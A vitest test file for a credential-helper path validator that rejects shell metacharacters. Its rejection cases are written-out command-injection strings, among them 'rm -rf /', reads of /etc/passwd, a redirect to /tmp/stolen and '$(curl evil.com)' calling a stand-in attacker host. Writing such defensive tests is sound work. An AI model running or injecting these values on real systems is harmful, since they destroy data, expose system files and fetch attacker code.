import { describe, it, expect } from 'vitest'
import { validateHelperPath, SHELL_METACHARACTERS } from './authValidation.js'

describe('SHELL_METACHARACTERS', () => {
  const dangerous = [';', '&', '|', '`', '$', '<', '>', '(', ')', '\n', '\r', "'", '"', '\\']

  for (const char of dangerous) {
    const label = char === '\n' ? '\\n' : char === '\r' ? '\\r' : char
    it(`matches dangerous character: ${label}`, () => {
      expect(SHELL_METACHARACTERS.test(`safe${char}path`)).toBe(true)
    })
  }

  it('does not match safe absolute paths', () => {
    expect(SHELL_METACHARACTERS.test('/usr/bin/my-helper')).toBe(false)
  })

  it('does not match simple names', () => {
    expect(SHELL_METACHARACTERS.test('my-credential-helper')).toBe(false)
  })

  it('does not match paths with dots and hyphens', () => {
    expect(SHELL_METACHARACTERS.test('/opt/tools/aws-cred-v2.3')).toBe(false)
  })
})

describe('validateHelperPath', () => {
  it('throws when path is undefined', () => {
    expect(() => validateHelperPath(undefined)).toThrow('Helper path is required')
  })

  it('throws when path is empty string', () => {
    expect(() => validateHelperPath('')).toThrow('Helper path is required')
  })

  it('returns the path for a valid absolute path', () => {
    expect(validateHelperPath('/usr/bin/helper')).toBe('/usr/bin/helper')
  })

  it('returns the path for a simple name', () => {
    expect(validateHelperPath('my-helper')).toBe('my-helper')
  })

  it.each([
    ['semicolon (command chaining)',     '/bin/helper; rm -rf /'],
    ['ampersand (background execution)', 'helper & malicious'],
    ['pipe (command piping)',            'helper | cat /etc/passwd'],
    ['backtick (command substitution)',  '`malicious`'],
    ['dollar sign (variable expansion)', 'helper$PATH'],
    ['single quotes',                    "helper'injected"],
    ['double quotes',                    'helper"injected'],
    ['newlines',                         'helper\nmalicious'],
    ['carriage returns',                 'helper\rmalicious'],
    ['backslash (escape sequences)',     'helper\\injected'],
    ['redirect operator >',             'helper > /tmp/stolen'],
    ['redirect operator <',             'helper < /etc/passwd'],
    ['subshell syntax',                  '$(curl evil.com)'],
  ])('rejects %s', (_, input) => {
    expect(() => validateHelperPath(input)).toThrow('shell metacharacters')
  })
})
